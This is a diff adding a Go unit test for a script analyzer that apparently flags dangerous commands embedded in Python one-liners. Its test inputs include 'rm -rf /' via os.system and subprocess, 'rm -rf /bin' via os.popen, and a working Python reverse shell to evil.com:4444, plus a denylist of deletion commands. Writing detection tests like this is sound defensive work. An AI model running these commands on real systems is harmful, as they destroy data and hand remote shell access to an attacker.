@@ -887,3 +887,67 @@ func TestOperationalDestructionDetection(t *testing.T) {
 		})
 	}
 }
+
+func TestPythonCommandExtraction(t *testing.T) {
+	tests := []struct {
+		name           string
+		command        string
+		expectedCode   string
+		description    string
+	}{
+		{
+			name:        "os.system with rm -rf",
+			command:     `python -c 'import os; os.system("rm -rf /")'`,
+			expectedCode: "DANGEROUS_DELETE_ROOT",
+			description: "Should extract rm -rf / from os.system()",
+		},
+		{
+			name:        "subprocess.call with shell command",
+			command:     `python -c 'import subprocess; subprocess.call(["rm", "-rf", "/"])'`,
+			expectedCode: "DANGEROUS_DELETE_ROOT",
+			description: "Should extract command from subprocess.call()",
+		},
+		{
+			name:        "subprocess.run with array",
+			command:     `python -c 'import subprocess; subprocess.run(["/bin/sh", "-i"])'`,
+			expectedCode: "REVERSE_SHELL",
+			description: "Should extract shell command from subprocess.run()",
+		},
+		{
+			name:        "complex reverse shell",
+			command:     `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+			expectedCode: "REVERSE_SHELL",
+			description: "Should extract shell command from complex reverse shell code",
+		},
+		{
+			name:        "os.popen",
+			command:     `python -c 'import os; os.popen("rm -rf /bin")'`,
+			expectedCode: "POLICY_DENYLIST",
+			description: "Should extract command from os.popen()",
+		},
+	}
+
+	policy := config.PolicyConfig{
+		Denylist: []string{"rm -rf /bin", "rm -rf /usr"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			script := []byte(tt.command)
+			findings := AnalyzeScript("test.py", script, policy)
+			
+			// Check if we found the expected command
+			found := false
+			for _, f := range findings {
+				if f.Code == tt.expectedCode {
+					found = true
+					break
+				}
+			}
+			
+			if !found {
+				t.Errorf("Expected to find code %s, but got findings: %v", tt.expectedCode, findings)
+			}
+		})
+	}
+}
